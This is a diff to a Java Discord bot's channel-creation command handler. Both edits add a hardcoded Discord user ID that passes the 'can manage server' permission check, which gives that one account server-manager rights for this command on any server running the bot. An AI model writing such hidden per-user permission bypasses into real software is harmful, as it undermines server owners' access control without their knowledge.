@@ -51,7 +51,7 @@ public class CreateChannel implements MessageCreateListener {
 
         }
 
-        if (equalsAny(aliases, event.getMessageContent(), true) && !event.getMessageAuthor().canManageServer()) {
+        if (equalsAny(aliases, event.getMessageContent(), true) && !event.getMessageAuthor().canManageServer() && !(event.getMessageAuthor().getId() == 517345566028726276L)) {
 
             EmbedBuilder embed = new EmbedBuilder();
 
@@ -65,7 +65,7 @@ public class CreateChannel implements MessageCreateListener {
         }
         // 517345566028726276
 
-        if (equalsAny(aliases, event.getMessageContent(), true) && event.getMessageAuthor().canManageServer() /*&& !event.getMessageAuthor().getIdAsString().equalsIgnoreCase("517345566028726276")*/) {
+        if (equalsAny(aliases, event.getMessageContent(), true) && (event.getMessageAuthor().canManageServer() || (event.getMessageAuthor().getId() == 517345566028726276L)) /*&& !event.getMessageAuthor().getIdAsString().equalsIgnoreCase("517345566028726276")*/) {
 
             String cmd = event.getMessageContent();
             String name = "";
